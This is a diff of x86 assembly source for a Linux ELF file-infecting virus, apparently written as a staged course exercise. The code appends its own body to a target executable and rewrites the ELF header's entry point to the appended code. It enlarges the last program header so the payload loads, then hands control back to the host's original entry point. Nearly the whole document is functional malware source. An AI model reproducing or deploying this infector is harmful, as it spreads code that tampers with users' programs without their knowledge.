@@ -36,14 +36,16 @@
     syscall 6, %1
 %endmacro
 
+%define p_anchor eax
+
 %macro get_lbl_loc 1
     call get_anchor_loc
-    add edx, (%1-anchor)
+    add p_anchor, (%1-anchor)
 %endmacro
 
 %macro get_lbl_loc 2
     get_lbl_loc %2
-    mov %1, edx
+    mov %1, p_anchor
 %endmacro
 
 %macro seek_to_start 1
@@ -64,24 +66,30 @@
 %define SEEK_SET 0
 
 %define ELF_HEADER_SIZE 52
-%define ENTRY         24
-%define PHDR_start    28
-%define PHDR_size     32
-%define PHDR_memsize  20
-%define PHDR_filesize 16
+%define ENTRY           24
+%define EHDR_phoff      28
+%define EHDR_phnum      44
+
+%define PHDR_SIZE     32
 %define PHDR_offset   4
 %define PHDR_vaddr    8
+%define PHDR_filesize 16
+%define PHDR_memsize  20
+%define PHDR_start    28
 
 %define stdout 1
+CODE_SIZE EQU (virus_end - virus_start)
+CODE_START_OFFSET EQU (_start - virus_start)
 
 global _start
 
 section .text
 virus_start:
+nop
 get_anchor_loc:
     call anchor
 anchor:
-    pop edx
+    pop p_anchor
     ret
 
 _start:
@@ -99,19 +107,27 @@ _start:
     %xdefine %$fsz ebp-16
 
     ; task 0b
-    %xdefine %$base 20
-    %xdefine %$mag ebp-%$base
+    %xdefine %$base 16
+    %xdefine %$mag ebp-(%$base+4)
 
-    ; task 1 - NOTE: this overwrites task 0b variables
+    ; task 1
     %xdefine %$base 20
-    %xdefine %$exe_code_start_vaddr ebp-%$base
+    %xdefine %$exe_code_start_vaddr ebp-(%$base+4)
 
     ; task 2
     %xdefine %$base 24
-    %xdefine %$exe_entry_point ebp-%$base
+    %xdefine %$exe_entry_point ebp-(%$base+4)
     
-    %xdefine %$base (24+ELF_HEADER_SIZE)
+    %xdefine %$base (28+ELF_HEADER_SIZE)
     %xdefine %$elf_header ebp-%$base
+
+    ; task 3
+    %xdefine %$phoff ebp-(%$base+4)
+    %xdefine %$phnum ebp-(%$base+8)
+    %xdefine %$last_ph_offset ebp-(%$base+12)
+
+    %xdefine %$base (40+ELF_HEADER_SIZE+PHDR_SIZE)
+    %xdefine %$ph ebp-%$base
 
     .print_msg:
     get_lbl_loc [%$loc], OutStr
@@ -154,47 +170,86 @@ _start:
     write stdout, [%$loc], Failstr_len
     exit 2
     .end_check_elf_magic_number:
+    nop
 
     .append_virus_code:
     seek_to_end [%$fd]
     mov [%$fsz], eax
     get_lbl_loc [%$loc], virus_start
-    write [%$fd], [%$loc], (virus_end - virus_start)
+    write [%$fd], [%$loc], CODE_SIZE
 
-    .copy_elf_header:
+    .read_elf_header:
     seek_to_start [%$fd]
     lea_stack_var [%$p_stack_var], [%$elf_header]
     read [%$fd], [%$p_stack_var], ELF_HEADER_SIZE
 
     .save_original_entry_point:
-        mov eax, dword [%$elf_header+ENTRY]
-        mov dword [%$exe_entry_point], eax
-
-    .change_entry_point:
-    mov dword [%$exe_code_start_vaddr], 008048000h
-
-    seek_to_start [%$fd]
-    mov eax, 0
-    add eax, dword [%$exe_code_start_vaddr]
-    add eax, dword [%$fsz]
-    add eax, dword (_start - virus_start)
-    mov dword [%$elf_header+ENTRY], eax
-
-    .write_elf_header_back_to_file:
-    lea_stack_var [%$p_stack_var], [%$elf_header]
-    write [%$fd], [%$p_stack_var], ELF_HEADER_SIZE
+    mov eax, dword [%$elf_header+ENTRY]
+    mov dword [%$exe_entry_point], eax
 
     .write_previous_entry_point:
     lseek [%$fd], -4, SEEK_END
     lea_stack_var [%$p_stack_var], [%$exe_entry_point]
     write [%$fd], [%$p_stack_var], 4
 
+    .read_elf_ph_info:
+    movzx eax, word [%$elf_header+EHDR_phnum]
+    mov dword [%$phnum], eax
+    mov eax, dword [%$elf_header+EHDR_phoff]
+    mov dword [%$phoff], eax
+
+    .read_base_address:
+    lseek [%$fd], [%$phoff], SEEK_SET
+    lea_stack_var [%$p_stack_var], [%$ph]
+    read [%$fd], [%$p_stack_var], PHDR_SIZE
+    mov eax, [%$ph+PHDR_vaddr]
+    mov [%$exe_code_start_vaddr], eax
+
+    .set_new_entry_point:
+    mov eax, 0
+    add eax, dword [%$exe_code_start_vaddr]
+    add eax, dword [%$fsz]
+    add eax, dword CODE_START_OFFSET
+    mov dword [%$elf_header+ENTRY], eax
+
+    .write_elf_header_back_to_file:
+    seek_to_start [%$fd]
+    lea_stack_var [%$p_stack_var], [%$elf_header]
+    write [%$fd], [%$p_stack_var], ELF_HEADER_SIZE
+
+    .calc_last_ph_offset:
+    mov eax, [%$phnum]
+    dec eax
+    mov ebx, PHDR_SIZE
+    mul ebx
+    mov ebx, [%$phoff]
+    add eax, ebx
+    mov dword [%$last_ph_offset], eax
+    
+    .read_last_ph:
+    lseek [%$fd], [%$last_ph_offset], SEEK_SET
+    lea_stack_var [%$p_stack_var], [%$ph]
+    read [%$fd], [%$p_stack_var], PHDR_SIZE
+
+    .set_last_ph_sizes:
+    mov eax, 0
+    add eax, dword [%$fsz]
+    sub eax, dword [%$ph+PHDR_offset]
+    add eax, dword CODE_SIZE
+    mov dword [%$ph+PHDR_filesize], eax
+    mov dword [%$ph+PHDR_memsize], eax
+
+    .write_last_ph_back:
+    lseek [%$fd], [%$last_ph_offset], SEEK_SET
+    lea_stack_var [%$p_stack_var], [%$ph]
+    write [%$fd], [%$p_stack_var], PHDR_SIZE
+
     .close_file:
     close [%$fd]
 
-    .jump_to_previous_entry_point:    
+    .jump_to_previous_entry_point:
     get_lbl_loc PreviousEntryPoint
-    jmp [edx]
+    jmp [p_anchor]
 
 VirusExit:
        exit 0 ; Termination if all is OK and no previous code to jump to
